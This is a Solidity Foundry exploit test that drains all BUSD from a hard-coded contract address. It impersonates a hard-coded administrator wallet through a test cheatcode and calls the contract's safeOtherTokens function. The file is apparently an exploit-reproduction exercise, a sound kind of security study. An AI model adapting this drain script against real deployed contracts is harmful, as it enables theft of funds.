// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface RightContract {
    function owner() external view returns (address);
    function safeOtherTokens(address token, address payable receiv, uint amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x99DE5611BC1f5b8e3D8876EF567b65f94C5a2ca3;
    address attacker = address(this);
    IERC20 busd;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    uint256 initialBalance; // Declared at contract level

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get BUSD token interface and check initial balances
        busd = IERC20(BUSD);

        // Get the owner/admin address from the contract
        address owner = RightContract(TARGET).owner();

        // Label addresses for clarity
        vm.label(BUSD, "BUSD Token");
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "RightContract");

        // Get initial BUSD balance of attacker
        initialBalance = busd.balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get contract instance
        RightContract target = RightContract(TARGET);

        // Step 2: Get BUSD balance of contract
        uint256 contractBusdBalance = busd.balanceOf(TARGET);
        require(contractBusdBalance > 0, "Contract has no BUSD balance");

        // Step 3: Try administrationWallet address (from constructor)
        address adminWallet = 0x3C6B38EaF1E135395B86dE368B39aac03Bd47b4C;

        // Step 4: Impersonate administrationWallet and call safeOtherTokens
        vm.startPrank(adminWallet);

        // Transfer all BUSD from contract to attacker
        target.safeOtherTokens(BUSD, payable(attacker), contractBusdBalance);

        vm.stopPrank();

        // Step 5: Verify balance increased
        uint256 finalBalance = busd.balanceOf(attacker);
        require(finalBalance > initialBalance, "BUSD balance did not increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

